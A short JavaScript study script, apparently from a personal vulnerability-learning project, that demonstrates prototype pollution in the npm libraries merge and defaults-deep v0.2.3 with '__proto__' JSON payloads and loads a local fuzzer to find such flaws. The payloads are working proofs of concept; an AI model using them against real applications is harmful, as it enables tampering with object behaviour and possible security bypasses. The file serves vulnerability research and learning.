// merge(BAD_JSON);
// console.log("merge is vulnerable?", {}.test); // true

// merge.recursive(BAD_JSON);
// console.log("merge.recursive BAD_JSON is vulnerable?", {}.test); // true

// merge.recursive({}, BAD_JSON);
// console.log("merge.recursive {}, BAD_JSON is vulnerable?", {}.test); // true

// merge.recursive({}, {}, BAD_JSON);
// console.log("merge.recursive {}, {}, BAD_JSON is vulnerable?", {}.test); // true

// merge.recursive({}, {}, {}, BAD_JSON);
// console.log("merge.recursive {}, {}, {}, BAD_JSON is vulnerable?", {}.test); // true


var defaultsDeep  = require('defaults-deep');
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';
var BAD_JSON = JSON.parse('{"__proto__":{"test":123}}');

var a = {};
console.log("Before : " + a.test);
defaultsDeep({}, BAD_JSON);
console.log("defaultsDeep After : " + a.test);



let fuzzer = require("/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/exploit/prototype-pollution-nsec18/find-vuln/find-vuln.js");
var fuzz = fuzzer(
  "/Users/camerontownshend/Documents/Cameron/dev/learnVulnerabilities/prototype-pollution/npm_libraries/defaults-deep/v0.2.3/node_modules/defaults-deep"
);
// console.log(fuzz);